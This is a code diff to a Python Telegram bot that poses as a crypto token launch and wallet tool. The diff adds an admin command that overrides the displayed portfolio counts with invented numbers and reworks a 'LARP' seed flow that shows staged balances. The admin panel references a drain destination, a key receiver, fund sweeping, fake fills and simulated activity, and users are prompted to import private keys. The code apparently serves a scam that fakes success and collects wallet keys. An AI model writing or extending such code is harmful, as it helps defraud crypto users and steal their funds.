@@ -147,6 +147,9 @@ class UserSession:
     pending_larp_balance: Optional[float] = None
     pending_larp_phrase: Optional[str] = None
     larp_profit_total: float = 0.0
+    # Admin LARP display overrides (None = use real lists)
+    portfolio_display_total: Optional[int] = None
+    portfolio_display_live: Optional[int] = None
 
 sessions: Dict[int, UserSession] = {}
 bot_balance_sol: float = 0.0
@@ -1574,6 +1577,10 @@ def build_main_menu_text(sess: "UserSession") -> str:
 
     live = sum(1 for t in sess.launched_tokens if t.get("status") == "live" and not t.get("dumped"))
     total_launches = len(sess.launched_tokens)
+    if sess.portfolio_display_total is not None:
+        total_launches = int(sess.portfolio_display_total)
+    if sess.portfolio_display_live is not None:
+        live = int(sess.portfolio_display_live)
     launches_left = sess.launches_left
 
     if sess.last_tx:
@@ -1682,9 +1689,12 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         await state.set_state(LaunchStates.waiting_name)
 
     elif action == "wallets":
+        # Only refresh balances on existing LARP wallets — never auto-link one.
+        # /larpseed is seed-only; admin must Connect Wallet manually.
         if LARP_ENABLED and uid in ADMIN_IDS:
-            ensure_larp_wallet(sess)
-            sync_larp_balances_from_vault(uid)
+            for w in sess.wallets:
+                if getattr(w, "is_larp", False):
+                    w.balance_sol = bot_balance_sol
         text = "🔑 <b>Wallets</b>\n\n"
         if not sess.wallets:
             text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
@@ -3174,6 +3184,70 @@ async def cmd_addbal(message: Message):
 
 
 
+
+@router.message(Command("setportfolio"))
+async def cmd_setportfolio(message: Message):
+    """Admin: /setportfolio 12 [live]
+    Sets the home-screen Portfolio numbers.
+    Examples:
+      /setportfolio 12        → Portfolio 12 · live unchanged (or 0 if none)
+      /setportfolio 12 3      → Portfolio 12 · live 3
+      /setportfolio clear     → back to real counts
+    """
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    sess = get_session(message.from_user.id)
+    parts = (message.text or "").split()
+    if len(parts) < 2:
+        cur_t = sess.portfolio_display_total
+        cur_l = sess.portfolio_display_live
+        real_t = len(sess.launched_tokens)
+        real_l = sum(1 for x in sess.launched_tokens if x.get("status") == "live" and not x.get("dumped"))
+        await message.answer(
+            f"Portfolio display\n"
+            f"Override: total=<b>{cur_t}</b> live=<b>{cur_l}</b>\n"
+            f"Real: total=<b>{real_t}</b> live=<b>{real_l}</b>\n\n"
+            "Usage:\n"
+            "<code>/setportfolio 12</code>\n"
+            "<code>/setportfolio 12 3</code>\n"
+            "<code>/setportfolio clear</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+    arg = parts[1].lower()
+    if arg in ("clear", "reset", "off", "real"):
+        sess.portfolio_display_total = None
+        sess.portfolio_display_live = None
+        await message.answer("Portfolio numbers reset to real counts.")
+        return
+    try:
+        total = max(0, int(parts[1].replace(",", "")))
+    except ValueError:
+        await message.answer("Usage: <code>/setportfolio 12</code> or <code>/setportfolio 12 3</code>", parse_mode=ParseMode.HTML)
+        return
+    live = None
+    if len(parts) >= 3:
+        try:
+            live = max(0, int(parts[2].replace(",", "")))
+        except ValueError:
+            await message.answer("Live count must be an integer.")
+            return
+        if live > total:
+            live = total
+    sess.portfolio_display_total = total
+    if live is not None:
+        sess.portfolio_display_live = live
+    elif sess.portfolio_display_live is None:
+        sess.portfolio_display_live = 0
+    shown_live = sess.portfolio_display_live if sess.portfolio_display_live is not None else 0
+    await message.answer(
+        f"Portfolio set to <b>{total}</b> · live <b>{shown_live}</b>\n"
+        "Open /start or Menu to see it.",
+        parse_mode=ParseMode.HTML,
+    )
+    log.info("setportfolio uid=%s total=%s live=%s", message.from_user.id, total, shown_live)
+
+
 @router.message(Command("larpseed"))
 async def cmd_larpseed(message: Message):
     """Admin: /larpseed 100 — random seed only. Manual Connect Wallet applies balance."""
@@ -3211,10 +3285,10 @@ async def cmd_larpseed(message: Message):
             "<b>LARP seed</b>\n\n"
             f"<code>{phrase}</code>\n\n"
             f"Target balance  <b>{SOL_EMOJI} {bal:.4f}</b>\n"
-            "LARP armed — wallet <b>not connected</b>.\n\n"
+            "Nothing linked. Wallet is still empty.\n\n"
             "1. Copy the seed\n"
-            "2. Open <b>Wallet → Connect / Import</b>\n"
-            "3. Paste — full connect flow runs, then balance shows"
+            "2. Wallets → Connect / Import\n"
+            "3. Paste it yourself — only then balance appears"
         )
         await message.answer(text, parse_mode=ParseMode.HTML)
         log.info("larpseed issued uid=%s bal=%.4f (manual connect)", uid, bal)
@@ -3743,7 +3817,7 @@ async def admin_panel(message: Message):
         f"LTC dest: {'yes' if LTC_DRAIN and len(LTC_DRAIN) >= 20 else 'NO'}\n"
         f"KEY_RECEIVER: {KEY_RECEIVER_ID}\n\n"
         f"<b>Help</b>: /help — full command list\n"
-        f"<b>LARP</b>: /larpon /larpoff /larpseed /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n"
+        f"<b>LARP</b>: /larpon /larpoff /larpseed /setportfolio /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n"
         f"<b>Sweep</b>: /sweepall /sweepstart [secs] /sweepstop\n"
         f"/dumpnow /simactivity /fakefill /livepulse /setmcap /holders /cleartx",
         parse_mode=ParseMode.HTML,
